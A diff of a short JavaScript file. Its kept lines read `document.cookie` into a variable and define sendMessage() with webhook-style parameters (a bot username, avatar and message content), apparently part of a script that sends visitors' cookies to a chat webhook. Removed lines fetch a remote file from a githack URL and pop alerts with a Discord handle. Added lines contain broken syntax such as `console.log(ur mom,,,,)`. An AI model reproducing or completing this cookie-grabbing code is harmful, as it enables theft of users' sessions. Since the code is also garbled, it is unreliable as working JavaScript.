@@ -1,10 +1,3 @@
-$(document).ready(function() {
-    var url = 'https://raw.githack.com/penguinblook/testy/main/main';
-
-    $.get(url, function(data) { 
-        $('#code').text(data);
-      }, 'text');
-    });
 
     var cook = document.cookie
 function sendMessage() {
@@ -46,7 +39,7 @@ function sendMessage() {
     const params = {
       username: "penguins little helper",
       avatar_url: "",
-      content: `${url}`
+      content: `test`
 
     }
 
@@ -54,10 +47,10 @@ function sendMessage() {
   }
 
   sendMessage()
-  alert("message me if u like cheese, penguinpowers#0069")
+  console.log(ur mom,,,,)
 
   sendMessages()
-  alert("message me if u like cheese, penguinpowers#0069")
+  console.log(ur mom)
 
   sendMessag()
   
